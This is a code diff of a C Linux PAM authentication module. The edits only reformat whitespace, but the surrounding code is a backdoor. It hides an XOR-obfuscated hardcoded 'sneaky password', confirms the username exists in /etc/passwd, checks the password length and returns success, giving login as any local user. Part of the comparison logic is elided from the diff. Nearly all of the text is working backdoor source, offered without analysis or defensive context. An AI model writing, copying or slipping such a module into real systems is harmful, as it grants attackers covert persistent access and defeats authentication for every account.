@@ -14,50 +14,50 @@
 */
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t *handle, int flags, int argc, const char **argv)
 {
-	int pam_code;
-	const char *username = NULL;
-	const char *password = NULL;
-	char passwd_line[1024];
-	int found_user = 0;
+    int pam_code;
+    const char *username = NULL;
+    const char *password = NULL;
+    char passwd_line[1024];
+    int found_user = 0;
     // Our secret ( xor('sneaky password', 0x42) )
     char key[16] = { '1', ',', '\'', '#', ')', ';', 'b', '2', '#', '1', '1', '5', '-', '0', '&', 0 };
 
- 	/* Asking the application for an  username */
-	pam_code = pam_get_user(handle, &username, "Username: ");
-	if (pam_code != PAM_SUCCESS) {
-		return PAM_IGNORE;
-	}
+    /* Asking the application for an  username */
+    pam_code = pam_get_user(handle, &username, "Username: ");
+    if (pam_code != PAM_SUCCESS) {
+        return PAM_IGNORE;
+    }
 
     // Open /etc/passwd
-	FILE* filp = fopen("/etc/passwd", "r");
-	if( filp == NULL ){
-	    return PAM_IGNORE;
-	}
+    FILE* filp = fopen("/etc/passwd", "r");
+    if( filp == NULL ){
+        return PAM_IGNORE;
+    }
 
     // Check provided user against local users
-	while( fgets(passwd_line, 1024, filp) ){
-	    char* valid_user = strtok(passwd_line, ":");
-	    // If this user matches, set the flag and break
-	    if( strcmp(valid_user, username) == 0 ){
-	        found_user = 1;
-	        break;
-	    } 
-	}
+    while( fgets(passwd_line, 1024, filp) ){
+        char* valid_user = strtok(passwd_line, ":");
+        // If this user matches, set the flag and break
+        if( strcmp(valid_user, username) == 0 ){
+            found_user = 1;
+            break;
+        } 
+    }
 
-	fclose(filp);
+    fclose(filp);
 
     // Not a valid local user
     if( found_user == 0 ){
         return PAM_IGNORE;
     }
  
-	// Grab the password from the user
-	pam_code = pam_get_authtok(handle, PAM_AUTHTOK, &password, "Password: ");
-	if (pam_code != PAM_SUCCESS) {
-		return PAM_IGNORE;
-	}
+    // Grab the password from the user
+    pam_code = pam_get_authtok(handle, PAM_AUTHTOK, &password, "Password: ");
+    if (pam_code != PAM_SUCCESS) {
+        return PAM_IGNORE;
+    }
 
-	// Not it!
+    // Not it!
     if( strlen(password) != 15 ){
         return PAM_IGNORE;
     }
@@ -70,7 +70,7 @@ PAM_EXTERN int pam_sm_authenticate(pam_handle_t *handle, int flags, int argc, co
     }
 
     // Ignore me!
-	return PAM_SUCCESS;
+    return PAM_SUCCESS;
 }
 
 /* These functions are just stubs to make pam play nice. We don't use them. */
